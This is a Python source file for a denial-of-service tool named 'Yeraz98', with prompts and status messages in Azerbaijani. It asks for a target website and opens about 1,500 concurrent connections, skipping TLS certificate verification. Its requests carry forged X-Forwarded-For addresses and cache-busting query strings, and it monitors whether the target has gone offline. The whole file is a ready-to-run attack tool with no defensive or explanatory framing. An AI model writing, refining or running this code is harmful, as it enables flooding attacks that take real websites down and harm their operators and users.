import asyncio, random, ssl, aiohttp, os
from urllib.parse import urlparse

class Yeraz98:
    def __init__(self, target, intensity=1500):
        if not target.startswith(("http", "https")): target = "https://" + target
        p = urlparse(target)
        self.host, self.port = p.netloc, (p.port if p.port else (443 if p.scheme=="https" else 80))
        self.is_https = p.scheme == "https"
        self.intensity, self.is_active, self.conns, self.status = intensity, False, 0, "Hazirlanir..."

    async def check(self):
        async with aiohttp.ClientSession() as s:
            while self.is_active:
                try:
                    async with s.get(f"{'https' if self.is_https else 'http'}://{self.host}", timeout=3) as r:
                        self.status = f"\033[92mOnline ({r.status})\033[0m" if r.status < 500 else f"\033[91mCOKUB ({r.status})\033[0m"
                except: self.status = "\033[91mOFFLINE (503/504)\033[0m"
                await asyncio.sleep(3)

    async def attack(self):
        while self.is_active:
            w = None
            try:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                _, w = await asyncio.open_connection(self.host, self.port, ssl=ctx if self.is_https else None)
                self.conns += 1
                ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                req = f"GET /?{random.getrandbits(32)} HTTP/1.1\r\nHost: {self.host}\r\nX-Forwarded-For: {ip}\r\nConnection: keep-alive\r\n\r\n"
                w.write(req.encode()); await w.drain()
                await asyncio.sleep(random.uniform(5, 15))
                self.conns -= 1
            except:
                if w: w.close()
                await asyncio.sleep(0.01)

    async def monitor(self):
        while self.is_active:
            print(f"\r\033[96mKanal: {self.conns} | Durum: {self.status}\033[0m", end="")
            await asyncio.sleep(1)

    async def start(self):
        self.is_active = True
        os.system("clear")
        print(f"\033[93m[*] Yeraz98 Ultra-Heavy Basladilir: {self.host}\033[0m")
        tasks = [self.attack() for _ in range(self.intensity)] + [self.monitor(), self.check()]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    h = input("Hedef sayt: ").strip()
    try: asyncio.run(Yeraz98(h).start())
    except KeyboardInterrupt: print("\nDayandirildi.")

